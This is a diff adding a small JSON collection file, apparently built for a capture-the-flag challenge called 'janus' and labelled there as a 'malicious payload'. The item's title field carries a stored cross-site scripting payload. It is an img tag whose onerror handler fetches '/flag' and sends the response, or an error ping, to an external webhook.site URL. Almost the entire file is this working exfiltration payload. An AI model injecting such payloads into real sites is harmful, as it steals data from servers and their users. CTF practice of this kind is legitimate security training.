@@ -1,0 +1,14 @@
+{
+  "collection": {
+    "items": [{
+      "data": [{
+        "title": "<img src=x onerror=\"fetch('/flag').then(r=>r.text()).then(t=>fetch('https://webhook.site/529c55fd-f89a-4b2a-a39e-dc713d191cfa?f='+encodeURIComponent(t))).catch(e=>fetch('https://webhook.site/529c55fd-f89a-4b2a-a39e-dc713d191cfa?err=1'))\">",
+        "description": "malicious payload for janus CTF"
+      }],
+      "links": [{
+        "href": "https://picsum.photos/600/400",
+        "render": "image"
+      }]
+    }]
+  }
+}
